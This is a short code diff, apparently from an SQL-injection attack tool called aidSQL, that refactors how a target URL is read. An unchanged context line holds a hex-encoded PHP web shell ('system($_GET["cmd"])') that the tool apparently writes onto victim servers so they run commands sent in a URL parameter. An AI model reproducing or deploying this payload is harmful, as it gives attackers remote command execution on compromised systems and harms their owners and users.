@@ -633,7 +633,7 @@
 
 				$shellCode	=	"0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e";
 			
-				$url	=	new \aidSQL\http\URL($this->_httpAdapter->getUrl());
+				$url	=	$this->_httpAdapter->getUrl();
 				$host	=	$url->getHost();
 				$url	=	$url->getScheme()."://$host";
 
